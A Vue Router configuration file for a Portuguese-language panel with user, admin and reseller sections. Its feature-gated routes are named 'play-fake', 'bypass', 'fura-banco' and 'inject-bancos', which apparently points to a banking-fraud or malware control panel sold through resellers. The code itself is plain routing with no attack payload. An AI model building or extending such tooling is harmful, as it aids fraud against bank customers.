import { createRouter, createWebHistory } from 'vue-router';
import LoginView from '../views/LoginView.vue';
import DashboardView from '../views/DashboardView.vue';
import DashboardHomeView from '../views/DashboardHomeView.vue';
import MeusAppsView from '../views/MeusAppsView.vue';
import QrCodeView from '../views/QrCodeView.vue';
import BypassView from '../views/BypassView.vue';
import FuraBancoView from '../views/FuraBancoView.vue';
import ConsultaView from '../views/ConsultaView.vue';
import TopRankPageView from '../views/TopRankPageView.vue';
import RankingView from '../views/RankingView.vue';
import GaleriaTemplatesView from '../views/GaleriaTemplatesView.vue';
import TemplateDetalheView from '../views/TemplateDetalheView.vue';
import TutoriaisView from '../views/TutoriaisView.vue';
import SuporteView from '../views/SuporteView.vue';
import AdminDashboardView from '../views/AdminDashboardView.vue';
import FinanceiroView from '../views/FinanceiroView.vue';
import AdminUsuariosView from '../views/AdminUsuariosView.vue';
import AdminUsuarioEditorView from '../views/AdminUsuarioEditorView.vue';
import PlanosView from '../views/PlanosView.vue';
import AdminPlanoEditorView from '../views/AdminPlanoEditorView.vue';
import DominiosView from '../views/DominiosView.vue';
import AdminAppsView from '../views/AdminAppsView.vue';
import LogsView from '../views/LogsView.vue';
import AdminTopRankView from '../views/AdminTopRankView.vue';
import AdminServicosView from '../views/AdminServicosView.vue';
import AdminAvisoTelaView from '../views/AdminAvisoTelaView.vue';
import AdminTutorialEditorView from '../views/AdminTutorialEditorView.vue';
import AdminSuporteConversaView from '../views/AdminSuporteConversaView.vue';
import RevendedorUsuariosView from '../views/RevendedorUsuariosView.vue';
import RevendedorUsuarioEditorView from '../views/RevendedorUsuarioEditorView.vue';
import RevendedorAppsView from '../views/RevendedorAppsView.vue';
import RevendedorTopRankView from '../views/RevendedorTopRankView.vue';
import RevendedorTutoriaisView from '../views/RevendedorTutoriaisView.vue';
import RevendedorTutorialEditorView from '../views/RevendedorTutorialEditorView.vue';
import RevendedorSuporteConversaView from '../views/RevendedorSuporteConversaView.vue';
import { useAuthStore } from '../stores/auth';

const routes = [
  { path: '/', redirect: '/login' },
  { path: '/login', name: 'login', component: LoginView },
  { path: '/acesso', name: 'acesso', component: LoginView },

  {
    path: '/',
    component: DashboardView,
    meta: { requiresAuth: true },
    children: [
      // Rotas do Usuário
      { path: 'dashboard',        name: 'user-dashboard',  component: DashboardHomeView },
      { path: 'play-fake',        name: 'play-fake',       component: MeusAppsView, meta: { requiresFuncionalidade: 'play-fake' } },
      { path: 'bypass',            name: 'bypass',          component: BypassView, meta: { requiresFuncionalidade: 'bypass' } },
      { path: 'fura-banco',      name: 'fura-banco',      component: FuraBancoView, meta: { requiresFuncionalidade: 'fura-banco' } },
      { path: 'consulta',         name: 'consulta',        component: ConsultaView, meta: { requiresFuncionalidade: 'consulta' } },
      { path: 'top-rank',         name: 'top-rank',        component: TopRankPageView },
      { path: 'ranking',          name: 'ranking',         component: RankingView },
      { path: 'qrcode',           name: 'qr-code',         component: QrCodeView, meta: { requiresFuncionalidade: 'qr-code' } },
      { path: 'templates',        name: 'templates',       component: GaleriaTemplatesView, meta: { requiresFuncionalidade: 'screen-troll' } },
      { path: 'templates/:id',    name: 'template-detalhe', component: TemplateDetalheView, meta: { requiresFuncionalidade: 'screen-troll' } },
      { path: 'inject-bancos',    name: 'inject-bancos',   component: GaleriaTemplatesView, meta: { requiresFuncionalidade: 'inject-banco' } },
      { path: 'inject-bancos/:id', name: 'inject-bancos-detalhe', component: TemplateDetalheView, meta: { requiresFuncionalidade: 'inject-banco' } },
      { path: 'tutoriais',        name: 'tutoriais',       component: TutoriaisView },
      { path: 'suporte',          name: 'suporte',         component: SuporteView },

      // Rotas do Admin
      { path: 'admin/dashboard',           name: 'admin-dashboard',      component: AdminDashboardView },
      { path: 'admin/financeiro',          name: 'admin-financeiro',     component: FinanceiroView },
      { path: 'admin/usuarios',            name: 'admin-usuarios',       component: AdminUsuariosView },
      { path: 'admin/usuarios/novo',       name: 'admin-usuario-novo',   component: AdminUsuarioEditorView },
      { path: 'admin/usuarios/:id',        name: 'admin-usuario-editar', component: AdminUsuarioEditorView },
      { path: 'admin/revendedores',        name: 'admin-revendedores',   component: AdminUsuariosView },
      { path: 'admin/planos',              name: 'admin-planos',         component: PlanosView },
      { path: 'admin/planos/novo',         name: 'admin-plano-novo',     component: AdminPlanoEditorView },
      { path: 'admin/planos/:id',          name: 'admin-plano-editar',   component: AdminPlanoEditorView },
      { path: 'admin/dominios',            name: 'admin-dominios',       component: DominiosView },
      { path: 'admin/apps',                name: 'admin-apps',           component: AdminAppsView },
      { path: 'admin/logs',                name: 'admin-logs',           component: LogsView },
      { path: 'admin/top-rank',            name: 'admin-top-rank',       component: AdminTopRankView },
      { path: 'admin/templates',           name: 'admin-templates',      component: GaleriaTemplatesView },
      { path: 'admin/servicos',            name: 'admin-servicos',       component: AdminServicosView },
      { path: 'admin/sistema/tela-encerramento', name: 'admin-aviso-tela', component: AdminAvisoTelaView },
      { path: 'admin/tutoriais',           name: 'admin-tutoriais',      component: TutoriaisView },
      { path: 'admin/tutoriais/novo',      name: 'admin-tutorial-novo',  component: AdminTutorialEditorView },
      { path: 'admin/tutoriais/:id',       name: 'admin-tutorial-editar', component: AdminTutorialEditorView },
      { path: 'admin/suporte',             name: 'admin-suporte',        component: SuporteView },
      { path: 'admin/suporte/:id',         name: 'admin-suporte-conversa', component: AdminSuporteConversaView },

      // Rotas do Revendedor
      { path: 'revendedor',                name: 'rev-root',             redirect: 'revendedor/usuarios' },
      { path: 'revendedor/usuarios',       name: 'rev-usuarios',         component: RevendedorUsuariosView },
      { path: 'revendedor/usuarios/novo',  name: 'rev-usuario-novo',     component: RevendedorUsuarioEditorView },
      { path: 'revendedor/usuarios/:id',   name: 'rev-usuario-editar',   component: RevendedorUsuarioEditorView },
      { path: 'revendedor/apps',           name: 'rev-apps',             component: RevendedorAppsView },
      { path: 'revendedor/top-rank',       name: 'rev-top-rank',         component: RevendedorTopRankView },
      { path: 'revendedor/tutoriais',      name: 'rev-tutoriais',        component: RevendedorTutoriaisView },
      { path: 'revendedor/tutoriais/novo', name: 'rev-tutorial-novo',    component: RevendedorTutorialEditorView },
      { path: 'revendedor/tutoriais/:id',  name: 'rev-tutorial-editar',  component: RevendedorTutorialEditorView },
      { path: 'revendedor/suporte',        name: 'rev-suporte',          component: SuporteView },
      { path: 'revendedor/suporte/:conversationId', name: 'rev-suporte-conversa', component: RevendedorSuporteConversaView },
    ]
  },

  { path: '/:pathMatch(.*)*', redirect: '/login' }
];

const router = createRouter({
  history: createWebHistory(),
  routes
});

router.beforeEach((to, _from, next) => {
  const authStore = useAuthStore();
  if (to.meta.requiresAuth && !authStore.isAuthenticated) {
    return next('/login');
  }
  if (to.path === '/login' && authStore.isAuthenticated) {
    return next('/dashboard');
  }
  if (to.meta.requiresFuncionalidade) {
    const flag = to.meta.requiresFuncionalidade as string;
    if (!authStore.hasFuncionalidade(flag)) {
      return next('/dashboard');
    }
  }
  next();
});

export default router;
